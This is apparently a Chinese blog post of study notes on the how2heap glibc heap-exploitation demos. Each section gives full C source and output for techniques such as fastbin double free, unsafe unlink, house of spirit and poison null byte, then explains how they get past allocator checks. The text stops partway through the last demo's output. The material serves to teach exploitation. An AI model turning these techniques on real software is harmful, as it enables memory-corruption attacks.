---
title: how2heap 学习
date: 2019-12-09 14:36:48
lastmod: 2020-2-25 14:36:48
tags:
  - 堆漏洞
categories:
  - 二进制安全
---

距离文章发布两个多月后，终于更新完啦！

<!--more-->

## first_fit

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    fprintf(stderr,"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n");
    fprintf(stderr,"glibc uses a first-fit algorithm to select a free chunk.\n");
    fprintf(stderr,"If a chunk is free and large enough, malloc will select this chunk.\n");
    fprintf(stderr,"This can be exploited in a use-after-free situation.\n");

    fprintf(stderr,"Allocating 2 buffers. They can be large, don't have to be fastbin.\n");
    char* a = malloc(0x512);
    char* b = malloc(0x256);
    char* c;

    fprintf(stderr,"1st malloc(0x512): %p\n", a);
    fprintf(stderr,"2nd malloc(0x256): %p\n", b);
    fprintf(stderr,"we could continue mallocing here...\n");
    fprintf(stderr,"now let's put a string at a that we can read later \"this is A!\"\n");
    strcpy(a,"this is A!");
    fprintf(stderr,"first allocation %p points to %s\n", a, a);

    fprintf(stderr,"Freeing the first one...\n");
    free(a);

    fprintf(stderr,"We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n", a);

    fprintf(stderr,"So, let's allocate 0x500 bytes\n");
    c = malloc(0x500);
    fprintf(stderr,"3rd malloc(0x500): %p\n", c);
    fprintf(stderr,"And put a different string here, \"this is C!\"\n");
    strcpy(c,"this is C!");
    fprintf(stderr,"3rd allocation %p points to %s\n", c, c);
    fprintf(stderr,"first allocation %p points to %s\n", a, a);
    fprintf(stderr,"If we reuse the first allocation, it now holds the data from the third allocation.\n");
}
```

输出：

```
This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.
glibc uses a first-fit algorithm to select a free chunk.
If a chunk is free and large enough, malloc will select this chunk.
This can be exploited in a use-after-free situation.
Allocating 2 buffers. They can be large, don't have to be fastbin.
1st malloc(0x512): 0x121f010
2nd malloc(0x256): 0x121f530
we could continue mallocing here...
now let's put a string at a that we can read later"this is A!"
first allocation 0x121f010 points to this is A!
Freeing the first one...
We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x121f010
So, let's allocate 0x500 bytes
3rd malloc(0x500): 0x121f010
And put a different string here, "this is C!"
3rd allocation 0x121f010 points to this is C!
first allocation 0x121f010 points to this is C!
If we reuse the first allocation, it now holds the data from the third allocation.
```

这个例子很简单，由于初始分配给 `a` 的 `0x512` 字节刚刚被释放，此时分配一块小于 `0x512` 字节的内存必定会使用刚才 `a` 使用的内存区域。注意如果最后使用被释放的指针 `a`，那么它仍然指向 `this is C!` 字符串，这就是通常说的 `use after free`。

## fastbin_dup

源码：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr,"This file demonstrates a simple double-free attack with fastbins.\n");

    fprintf(stderr,"Allocating 3 buffers.\n");
    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);

    fprintf(stderr,"1st malloc(8): %p\n", a);
    fprintf(stderr,"2nd malloc(8): %p\n", b);
    fprintf(stderr,"3rd malloc(8): %p\n", c);

    fprintf(stderr,"Freeing the first one...\n");
    free(a);

    fprintf(stderr,"If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    // free(a);

    fprintf(stderr,"So, instead, we'll free %p.\n", b);
    free(b);

    fprintf(stderr,"Now, we can free %p again, since it's not the head of the free list.\n", a);
    free(a);

    fprintf(stderr,"Now the free list has [%p, %p, %p]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
    fprintf(stderr,"1st malloc(8): %p\n", malloc(8));
    fprintf(stderr,"2nd malloc(8): %p\n", malloc(8));
    fprintf(stderr,"3rd malloc(8): %p\n", malloc(8));
}
```

输出：

```
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x17e9010
2nd malloc(8): 0x17e9030
3rd malloc(8): 0x17e9050
Freeing the first one...
If we free 0x17e9010 again, things will crash because 0x17e9010 is at the top of the free list.
So, instead, we'll free 0x17e9030.
Now, we can free 0x17e9010 again, since it's not the head of the free list.
Now the free list has [0x17e9010, 0x17e9030, 0x17e9010]. If we malloc 3 times, we'll get 0x17e9010 twice!
1st malloc(8): 0x17e9010
2nd malloc(8): 0x17e9030
3rd malloc(8): 0x17e9010
```

这里如果释放 `a` 后再释放它一次，由于它位于 freelist 顶端过不了安全检查，得到：

```
*** Error in `./a.out': double free or corruption (fasttop): 0x00000000007aa010 ***
```

这就是我们说的 `double free`。然而我们第一次释放 `a` 后如果先释放另一个块 `b`，那么 `b` 就会位于 freelist 顶部，此时再次释放 `a` 就可以绕过 `double free` 的检测。这样做的结果是最后第一次和第三次 `malloc` 得到的两个不同指针指向了相同的地址。

## fastbin_dup_into_stack

源码：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr,"This file extends on fastbin_dup.c by tricking malloc into\n"
           "returning a pointer to a controlled location (in this case, the stack).\n");

    unsigned long long stack_var;

    fprintf(stderr,"The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

    fprintf(stderr,"Allocating 3 buffers.\n");
    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);

    fprintf(stderr,"1st malloc(8): %p\n", a);
    fprintf(stderr,"2nd malloc(8): %p\n", b);
    fprintf(stderr,"3rd malloc(8): %p\n", c);

    fprintf(stderr,"Freeing the first one...\n");
    free(a);

    fprintf(stderr,"If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    // free(a);

    fprintf(stderr,"So, instead, we'll free %p.\n", b);
    free(b);

    fprintf(stderr,"Now, we can free %p again, since it's not the head of the free list.\n", a);
    free(a);

    fprintf(stderr,"Now the free list has [%p, %p, %p]. "
        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
    unsigned long long *d = malloc(8);

    fprintf(stderr,"1st malloc(8): %p\n", d);
    fprintf(stderr,"2nd malloc(8): %p\n", malloc(8));
    fprintf(stderr,"Now the free list has [%p].\n", a);
    fprintf(stderr,"Now, we have access to %p while it remains at the head of the free list.\n"
        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
        "so that malloc will think there is a free chunk there and agree to\n"
        "return a pointer to it.\n", a);
    stack_var = 0x20;

    fprintf(stderr,"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

    fprintf(stderr,"3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
    fprintf(stderr,"4th malloc(8): %p\n", malloc(8));
}
```

输出：

```
This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0x7ffe1610b248.
Allocating 3 buffers.
1st malloc(8): 0x1e3a010
2nd malloc(8): 0x1e3a030
3rd malloc(8): 0x1e3a050
Freeing the first one...
If we free 0x1e3a010 again, things will crash because 0x1e3a010 is at the top of the free list.
So, instead, we'll free 0x1e3a030.
Now, we can free 0x1e3a010 again, since it's not the head of the free list.
Now the free list has [0x1e3a010, 0x1e3a030, 0x1e3a010]. We'll now carry out our attack by modifying data at 0x1e3a010.
1st malloc(8): 0x1e3a010
2nd malloc(8): 0x1e3a030
Now the free list has [0x1e3a010].
Now, we have access to 0x1e3a010 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0x1e3a010 to point right before the 0x20.
3rd malloc(8): 0x1e3a010, putting the stack address on the free list
4th malloc(8): 0x7ffe1610b248
```

这里利用上一个例子的 `double free` 漏洞，来让 `malloc` 返回一个任意地址（并不一定是栈上地址），从而实现任意地址读写。首先还是以 `a->b->a` 的顺序释放内存，随后两次 `malloc` 使得 `d` 指向原来 `a` 指向的地址 `0x1e3a010`，并且 freelist 里只剩一个 `0x1e3a010`。

现在修改栈上变量 `stack_var` 的值为 `0x20`，这是为了伪造 `chunk_size` 头部让 `malloc` 以为这个地方有一个 chunk。这还不够，我们还需要让这个 chunk 被认为是空闲的，也就是要把它加入 freelist 中。

怎么做呢？我们知道，对于一个空闲 chunk 来说，`chunk_size` 下面就是 `fd`，存放下一个空闲 chunk 的地址。而 `malloc` 返回给用户的指针 `mem`（在这个例子中，`0x1e3a010`）恰好指向 `chunk_size` 的结尾处，也就是 `fd` 开始位置。现在我们拥有 `d` 指针，也就能修改这个位置的值让它指向 `stack_var` 的前一个栈单元（这里是向前 8 字节），这里就是这个伪造 chunk 的 `chunk` 指针。这样一来，当我们进行 `3rd malloc(8)` 时，该 `chunk` 指针就会进入 freelist 里，最后 `malloc` 的时候就会返回这个伪造 chunk 的 `mem` 指针。

注意栈从高地址向低地址生长，堆反过来，所以源码一开始是 `8+(char *)&stack_var`，而最后是 `((char*)&stack_var) - sizeof(d)`。

## fastbin_dup_consolidate

源码：

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr,"Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr,"Now free p1!\n");
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr,"Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr,"In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
  free(p1);
  fprintf(stderr,"Trigger the double free vulnerability!\n");
  fprintf(stderr,"We can pass the check in malloc() since p1 is not fast top.\n");
  fprintf(stderr,"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
}
```

输出：

```
Allocated two fastbins: p1=0x1af0010 p2=0x1af0060
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x1af00b0
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x1af0010 0x1af0010
```

首先分配了两个 0x40 的 chunk，实际大小为 0x50。需要 p2 是为了之后释放 p1 时不会和 top chunk 合并。随后释放其中一个并申请 0x400 的 chunk，这时会尝试从 unsorted bin 中切割，但是空间不足，触发了 `malloc_consolidate`，使得 fastbin 中的 p1 进入 unsorted bin（实际上，如果此时有多个连续 chunk 在 fastbin 中，会先合并）中。

这个时候，fastbin 链表头部没有 p1 了，所以我们再次 `free(p1)` 就可以成功，造成 double free。现在 fastbin 和 unsorted bin 中都有 p1 了，我们可以两次 `malloc()` 拿到两个同样的指针。

## unsafe_unlink

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
    fprintf(stderr,"Welcome to unsafe unlink 2.0!\n");
    fprintf(stderr,"Tested in Ubuntu 14.04/16.04 64bit.\n");
    fprintf(stderr,"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
    fprintf(stderr,"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

    int malloc_size = 0x80; //we want to be big enough not to use fastbins
    int header_size = 2;

    fprintf(stderr,"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    fprintf(stderr,"The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
    fprintf(stderr,"The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

    fprintf(stderr,"We create a fake chunk inside chunk0.\n");
    fprintf(stderr,"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    fprintf(stderr,"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
    fprintf(stderr,"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    fprintf(stderr,"Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
    fprintf(stderr,"Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

    fprintf(stderr,"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    fprintf(stderr,"We shrink the size of chunk0 (saved as'previous_size'in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
    fprintf(stderr,"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
    chunk1_hdr[0] = malloc_size;
    fprintf(stderr,"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
    fprintf(stderr,"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
    chunk1_hdr[1] &= ~1;

    fprintf(stderr,"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
    fprintf(stderr,"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
    free(chunk1_ptr);

    fprintf(stderr,"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
    char victim_string[8];
    strcpy(victim_string,"Hello!~");
    chunk0_ptr[3] = (uint64_t) victim_string;

    fprintf(stderr,"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
    fprintf(stderr,"Original value: %s\n",victim_string);
    chunk0_ptr[0] = 0x4141414142424242LL;
    fprintf(stderr,"New Value: %s\n",victim_string);
}
```

输出：

```
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x602070, pointing to 0x23ed010
The victim chunk we are going to corrupt is at 0x23ed0a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x602058
Fake chunk bk: 0x602060

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as'previous_size'in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
```

利用 unlink 漏洞一般需要堆溢出以及全局指针变量。在这个例子里全局指针变量就是 `chunk0` 的 mem 指针，`chunk0` 中存在堆溢出，可以溢出到 `chunk1`。

我们首先看一下 `unlink` 这个宏，它被用来从 bin 中删除 chunk：

```c
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;                                                               \
    BK = P->bk;                                                               \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     \
      malloc_printerr (check_action,"corrupted double-linked list", P, AV);  \
    else {                                                                    \
        FD->bk = BK;                                                          \
        BK->fd = FD;                                                          \
        if (!in_smallbin_range (P->size)                                      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {                \
            if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)        \
                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr (check_action,                                  \
                               "corrupted double-linked list (not small)",    \
                               P, AV);                                        \
            if (FD->fd_nextsize == NULL) {                                    \
                if (P->fd_nextsize == P)                                      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;                     \
                else {                                                        \
                    FD->fd_nextsize = P->fd_nextsize;                         \
                    FD->bk_nextsize = P->bk_nextsize;                         \
                    P->fd_nextsize->bk_nextsize = FD;                         \
                    P->bk_nextsize->fd_nextsize = FD;                         \
                  }                                                           \
              } else {                                                        \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;                 \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;                 \
              }                                                               \
          }                                                                   \
      }                                                                       \
}
```

可以先忽略下面和 large bin 相关的部分，关注开头：首先要求满足两个条件：

- `(P->fd)->bk == P`
- `(P->bk)->fd == P`

如果满足，则执行：

```
(P->fd)->bk = P->bk
(P->bk)->fd = P->fd
```

这就是普通的双向链表删除结点的操作，不安全的地方在于上面的检查，我们可以伪造堆块来绕过这个检查。

我们在 chunk0 里伪造 chunk。对于 `chunk0_ptr`，我们预留 `0x10` 空间给伪 chunk 的 `prev_size` 和 `chunk_size` 字段，此时 `chunk0_ptr` 就是 `fake_chunk` 的 chunk 指针。那么其 `fd` 实际上就是 `*(chunk0_ptr + 2)`，其 `bk` 实际上就是 `*(chunk0_ptr + 3)`。用 `_0` 后缀表示属于 chunk0 的字段，`_f` 表示属于伪造 chunk 的字段（从左至右、从下至上为低地址到高地址）：

```
 ---------------------------- <- chunk1_ptr
| prev_size_1 | chunk_size_1 |
 ----------------------------
| data                       |
 ----------------------------
| fd_f        | bk_f         |
 ----------------------------
| prev_size_f | chunk_size_f |
 ---------------------------- <- chunk0_ptr
| prev_size_0 | chunk_size_0 |
 ----------------------------
```

如果我们让伪造的 `fd` 指向 `&chunk0_ptr - 0x18`（`0x8` 一个单位，即三个单位），那么要找到 `(fake_chunk->fd)->bk`，就需要计算 `(&chunk0_ptr - 0x18) + 0x18 = &chunk0_ptr`，这就回到了 `fake_chunk` 的 chunk 指针上，满足了第一个条件。

同理，让伪造的 `bk` 指向 `&chunk0_ptr - 0x10`，那么它的 `fd` 就需要把 `0x10` 加回来，同样回到了 `fake_chunk` 的 chunk 指针。这样就绕过了 unlink 的检查。

现在，由于存在堆溢出，我们将 `chunk1` 的 `prev_size` 写成我们 `fake_chunk` 的大小。在例子里 `chunk0` 大小为 0x90，而 `fake_chunk` 为 0x80。然后把 `chunk1` 的 `PREV_IN_USE` 位置为 0，这样以后再 `free(chunk1)`，此时分配器就会认为前面有一个空闲的大小为 0x80 的 chunk，也就是我们的 `fake chunk`，然后触发 `unlink(fake_chunk)` 来尝试与 `chunk1` 合并。

问题在于，我们从头到尾都没有真正释放过 `fake chunk`，因此它不可能出现在任何 bin 里，而 `unlink` 却尝试把它从 bin 里拆出来。这时执行链表删除操作，但由于 `(P->fd)->bk` 和 `(P->bk)->fd` 是相同的，只有后一句有意义，此时相当于执行了 `chunk0_ptr = &chunk0_ptr - 0x18`。

```
 ------------------
| &chunk0_ptr-0x18 |---
 ------------------    |
| ?                |   |
 ------------------    |
| ?                |   |
 ------------------ <---
| ?                |
 ------------------
```

那么同理，如果我们修改 `*(chunk0_ptr + 3)` 的值为 `Hello!~`，实际上就等于令 `chunk0_ptr` 指向 `Hello!~`，此时修改 `*chunk0_ptr`，那么 `Hello!~` 字符串就被覆盖了。

## house_of_spirit

源码：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr,"This file demonstrates the house of spirit attack.\n");

    fprintf(stderr,"Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr,"We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr,"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);

    fprintf(stderr,"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr,"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr,"The chunk.size of the *next* fake region has to be sane. That is> 2*SIZE_SZ (> 16 on x64) && <av->system_mem (<128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr,"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr,"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    a = &fake_chunks[2];

    fprintf(stderr,"Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr,"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr,"malloc(0x30): %p\n", malloc(0x30));
}
```

输出：

```
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake 'fastbin' region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7ffcdc8eeb88 and the second at 0x7ffcdc8eebc8.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && <av->system_mem (<128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffcdc8eeb88.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffcdc8eeb88, which will be 0x7ffcdc8eeb90!
malloc(0x30): 0x7ffcdc8eeb90
```

这个比较简单，在 `fake_chunks` 数组里伪造了 fastbin 大小的 chunk，确保当前 `chunk_size` 和 `nextsize` 合法后，把 fake chunk 的 mem 指针地址给指针 `a`，然后 `free(a)`，这样就使得 fake chunk 进入了 fastbin，下次 `malloc` 就会返回这个 mem 指针。

这里的合法是指：

- `chunk_size` 的 `IS_MMAPED` 为 0
- `chunk_size` 属于 fastbin 范围内
- `nextsize` 大于 `2*SIZE_SZ`，小于 `system_mem`

## poison_null_byte

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>


int main()
{
    fprintf(stderr,"Welcome to poison null byte 2.0!\n");
    fprintf(stderr,"Tested in Ubuntu 14.04 64bit.\n");
    fprintf(stderr,"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
    fprintf(stderr,"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

    uint8_t* a;
    uint8_t* b;
    uint8_t* c;
    uint8_t* b1;
    uint8_t* b2;
    uint8_t* d;
    void *barrier;

    fprintf(stderr,"We allocate 0x100 bytes for 'a'.\n");
    a = (uint8_t*) malloc(0x100);
    fprintf(stderr,"a: %p\n", a);
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr,"Since we want to overflow 'a', we need to know the 'real' size of 'a' "
        "(it may be more than 0x100 because of rounding): %#x\n", real_a_size);

    /* chunk size attribute cannot have a least significant byte with a value of 0x00.
     * the least significant byte of this will be 0x10, because the size of the chunk includes
     * the amount requested plus some amount required for the metadata. */
    b = (uint8_t*) malloc(0x200);

    fprintf(stderr,"b: %p\n", b);

    c = (uint8_t*) malloc(0x100);
    fprintf(stderr,"c: %p\n", c);

    barrier =  malloc(0x100);
    fprintf(stderr,"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
        "The barrier is not strictly necessary, but makes things less confusing\n", barrier);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8);

    // added fix for size==prev_size(next_chunk) check in newer versions of glibc
    // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
    // this added check requires we are allowed to have null pointers in b (not just a c string)
    //*(size_t*)(b+0x1f0) = 0x200;
    fprintf(stderr,"In newer versions of glibc we will need to have our updated size inside b itself to pass "
        "the check'chunksize(P) != prev_size (next_chunk(P))'\n");
    // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
    // which is the value of b.size after its first byte has been overwritten with a NULL byte
    *(size_t*)(b+0x1f0) = 0x200;

    // this technique works by overwriting the size metadata of a free chunk
    free(b);

    fprintf(stderr,"b.size: %#lx\n", *b_size_ptr);
    fprintf(stderr,"b.size is: (0x200 + 0x10) | prev_in_use\n");
    fprintf(stderr,"We overflow 'a' with a single null byte into the metadata of 'b'\n");
    a[real_a_size] = 0; // <--- THIS IS THE"EXPLOITED BUG"
    fprintf(stderr,"b.size: %#lx\n", *b_size_ptr);

    uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
    fprintf(stderr,"c.prev_size is %#lx\n",*c_prev_size_ptr);

    // This malloc will result in a call to unlink on the chunk where b was.
    // The added check (commit id: 17f487b), if not properly handled as we did before,
    // will detect the heap corruption now.
    // The check is this: chunksize(P) != prev_size (next_chunk(P)) where
    // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
    // next_chunk(P) == b-0x10+0x200 == b+0x1f0
    // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
    fprintf(stderr,"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
        *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
    b1 = malloc(0x100);

    fprintf(stderr,"b1: %p\n",b1);
    fprintf(stderr,"Now we malloc 'b1'. It will be placed where 'b' was. "
        "At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
    fprintf(stderr,"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
        "before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
    fprintf(stderr,"We malloc 'b2', our 'victim' chunk.\n");
    // Typically b2 (the victim) will be a structure with valuable pointers that we want to control

    b2 = malloc(0x80);
    fprintf(stderr,"b2: %p\n",b2);

    memset(b2,'B',0x80);
    fprintf(stderr,"Current b2 content:\n%s\n",b2);

    fprintf(stderr,"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about'b2').\n");

    free(b1);
    free(c);

    fprintf(stderr,"Finally, we allocate 'd', overlapping 'b2'.\n");
    d = malloc(0x300);
    fprintf(stderr,"d: %p\n",d);

    fprintf(stderr,"Now 'd' and 'b2' overlap.\n");
    memset(d,'D',0x300);

    fprintf(stderr,"New b2 content:\n%s\n",b2);

    fprintf(stderr,"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
        "for the clear explanation of this technique.\n");
}
```

输出：

```
Welcome to poison null byte 2.0!
Tested in Ubuntu 14.04 64bit.
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
We allocate 0x100 bytes for 'a'.
a: 0x19e6010
Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
b: 0x19e6120
c: 0x19e6330
We allocate a barrier at 0x19e6440, so that c is not consolidated with the top-chunk when freed.
The barrier is not strictly necessary, but makes things less confusing
In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'
b.size: 0x211
b.size is: (0x200 + 0x10) | prev_in_use
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x200
c.prev_size is 0x210
We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
b1: 0x19e6120
Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0x210
Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
We malloc 'b2', our 'victim' chunk.
b2: 0x19e6230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about'b2').
Finally, we allocate 'd', overlapping 'b2'.
d: 0x19e6120
Now 'd' and 'b2' overlap.
New b2 content:
